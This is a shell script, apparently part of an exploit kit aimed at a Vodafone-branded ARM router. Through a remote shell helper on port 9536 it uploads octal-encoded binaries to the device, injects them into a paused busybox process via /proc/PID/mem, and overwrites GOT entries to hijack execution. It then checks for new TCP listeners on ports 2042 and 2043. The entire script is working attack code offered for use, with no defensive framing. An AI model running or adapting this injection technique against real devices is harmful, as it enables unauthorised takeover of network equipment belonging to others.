#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
image=arm_vcm_memfd_host.bin
bootstrap=arm_vcm_memfd_bootstrap.bin

octal=$(od -An -v -to1 "$image" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
boot_octal=$(od -An -v -to1 "$bootstrap" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')

{
    sleep 2
    printf ': >/tmp/arm_vcm_memfd.bin; /bin/busybox rm -f /tmp/vcm-memfd-path\n'
    printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do
        printf "printf '%s' >>/tmp/arm_vcm_memfd.bin\n" "$chunk"
    done
    printf "printf '%s' >/tmp/arm_vcm_memfd_bootstrap.bin\n" "$boot_octal"
    printf '%s\n' '/bin/dd if=/dev/zero of=/dev/null bs=4096 & p=$!; /bin/sleep 1; kill -STOP $p; base=$(/usr/bin/awk '\''$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}'\'' /proc/$p/maps); image=$((0x$base+0x74000)); rgot=$((0x$base+0x8fb08)); wgot=$((0x$base+0x8fdf4)); /bin/dd if=/tmp/arm_vcm_memfd.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; /bin/dd if=/tmp/arm_vcm_memfd_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; printf "\\$(printf %03o $((image&255)))\\$(printf %03o $(((image>>8)&255)))\\$(printf %03o $(((image>>16)&255)))\\$(printf %03o $(((image>>24)&255)))" >/tmp/arm_vcm_memfd_pointer.bin; /bin/dd if=/tmp/arm_vcm_memfd_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc; /bin/dd if=/tmp/arm_vcm_memfd_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc; kill -CONT $p; /bin/sleep 3; /bin/echo HOLDER_PID=$p; /bin/echo MEMFD_PATH=$(/bin/cat /tmp/vcm-memfd-path 2>/dev/null); /bin/ls -l /tmp/vcm-memfd-path 2>/dev/null; /bin/grep -E "(:07FA |:07FB )" /proc/net/tcp'
    sleep 4
} | timeout 20 ./vodafone-direct-shell.sh "$host" 9536
